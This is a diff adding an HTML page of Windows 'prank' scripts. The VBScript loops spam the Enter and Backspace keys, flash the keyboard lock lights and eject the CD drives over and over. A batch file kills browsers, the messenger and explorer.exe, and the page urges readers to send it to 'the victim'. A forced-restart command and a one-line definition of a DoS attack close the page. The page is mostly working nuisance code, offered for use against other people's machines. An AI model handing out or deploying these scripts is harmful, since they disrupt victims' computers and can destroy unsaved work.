@@ -1,0 +1,124 @@
+<html>
+<style>
+
+body{ margin:0; padding:0; 
+
+
+
+    font-family: 'Open Sans', sans-serif;
+
+    font-family: 'Slabo 27px', serif;
+
+
+
+}
+
+.wrapper {
+    background: #141518;
+    color: #f2f2f2;
+	padding:20px;
+}
+
+
+.para {
+    background: #34373c none repeat scroll 0 0;
+    border-radius: 10px;
+    clear: both;
+    margin-bottom: 15px;
+    margin-left: auto;
+    margin-right: auto;
+    max-width: 900px;
+    overflow: hidden;
+    padding: 0 20px;
+}
+
+.para h2 {
+    font-size: 30px;
+}
+.para  p {
+    font-size: 16px;
+	line-height:24px;
+}
+
+
+.ul-title {
+    font-size: 20px;
+    font-weight: bold;
+}
+
+/*.wrapper p{ margin:0;}
+*/
+
+</style>
+
+<body>
+<div class="wrapper">
+<div class="para">
+<p><strong>Endless Enter</strong></p>
+<p>*This constantly makes it so the enter button is being pressed continuesly*</p>
+<p>Code:-</p>
+<p>Set wshShell = wscript.CreateObject(&rdquo;WScript.Shell&rdquo;)<br />do<br />wscript.sleep 100<br />wshshell.sendkeys &ldquo;~(enter)&rdquo;<br />loop</p>
+  </div>
+
+<div class="para">
+<p><strong>Endless Backspace</strong></p>
+<p>*This makes it so the backspace key is constantly being pressed*</p>
+<p>Code:-</p>
+<p>MsgBox &ldquo;Let&rsquo;s go back a few steps&rdquo;<br />Set wshShell =wscript.CreateObject(&rdquo;WScript.Shell&rdquo;)<br />do<br />wscript.sleep 100<br />wshshell.sendkeys &ldquo;{bs}&rdquo;<br />loop</p>
+  </div>
+
+<div class="para">
+<p><strong>Make Your Keyboard Disco Light</strong></p>
+<p>This trick just makes your keyboard lights do disco.<br />The script I&rsquo;m sharing with you, when executed makes your Caps, Num and Scroll Lock&rsquo;s light flash in a cool rhythmic way!</p>
+<p>1. This piece of code makes ur keyboard a live disco..</p>
+<p>Set wshShell =wscript.CreateObject(&ldquo;WScript.Shell&rdquo;)<br />do<br />wscript.sleep 100<br />wshshell.sendkeys &ldquo;{CAPSLOCK}&rdquo;<br />wshshell.sendkeys &ldquo;{NUMLOCK}&rdquo;<br />wshshell.sendkeys &ldquo;{SCROLLLOCK}&rdquo;<br />loop</p>
+<p>2. This one makes it looks like a chain of light&hellip;.</p>
+<p>Set wshShell =wscript.CreateObject(&ldquo;WScript.Shell&rdquo;)<br />do<br />wscript.sleep 200<br />wshshell.sendkeys &ldquo;{CAPSLOCK}&rdquo;<br />wscript.sleep 100<br />wshshell.sendkeys &ldquo;{NUMLOCK}&rdquo;<br />wscript.sleep 50<br />wshshell.sendkeys &ldquo;{SCROLLLOCK}&rdquo;<br />loop</p>
+<p>Instructions:<br />*paste any of the two above codes in notepad<br />*Save as &ldquo;AnyFileName&rdquo;.vbs<br />*Run the file<br />*To stop, launch task manager and then under &ldquo;Processes&rdquo; end &ldquo;wscript.exe&rdquo;</p>
+  </div>
+
+<div class="para">
+<p><strong>Tasks Kill</strong></p>
+<p>@echo off</p>
+<p>start calc</p>
+<p>tskill msnmsgr</p>
+<p>tskill firefox</p>
+<p>tskill iexplore</p>
+<p>tskill LimreWire</p>
+<p>tskill explorer</p>
+<p>tskill explorer</p>
+<p>tskill explorer</p>
+<p>tskill explorer</p>
+<p>tskill explorer</p>
+<p>pause</p>
+<p>save this as .bat file and send and destroy the victim &amp; k!ll Operat!ng systeM!</p>
+  
+  </div>
+
+<div class="para">
+<p><strong>Code type in notepad</strong></p>
+<p>@echo off<br />shutdown -r -f -t 00</p>
+<p>Form Of Switches</p>
+<p>-s<br />Shuts down the PC.</p>
+<p>-l<br />Logs off the current user.</p>
+<p>-t nn<br />Indicates the duration of delay, in seconds, before performing the action.</p>
+<p>-c &ldquo;messagetext&rdquo;<br />Displays a message in the System Shutdown window. A maximum of 127 characters can be used. The message must be enclosed in quotation marks.</p>
+<p>-f<br />Forces any running applications to shut down.</p>
+<p>-r<br />Reboots the PC. ..!!..!</p>
+  </div>
+
+<div class="para">
+<p><strong>Popping CD Drives</strong></p>
+<p>*This will make the CD drives constantly pop out*</p>
+<p>Code:-</p>
+<p>Set oWMP = CreateObject(&rdquo;WMPlayer.OCX.7?)<br />Set colCDROMs = oWMP.cdromCollection<br />do<br />if colCDROMs.Count &gt;= 1 then<br />For i = 0 to colCDROMs.Count &ndash; 1<br />colCDROMs.Item(i).Eject<br />Next<br />For i = 0 to colCDROMs.Count &ndash; 1<br />colCDROMs.Item(i).Eject<br />Next<br />End If<br />wscript.sleep 100<br />loop</p>
+</div>
+
+<div class="para">
+<p><strong>What is DOS attack ?</strong></p>
+<p>A denial of service (DoS) attack is an attack that clogs up so much memory on the target system that it can not serve it&rsquo;s users, or it causes the target system to crash, reboot, or otherwise deny services to legitimate users.</p>
+</div>
+
+</div>
+</body>
+</html>
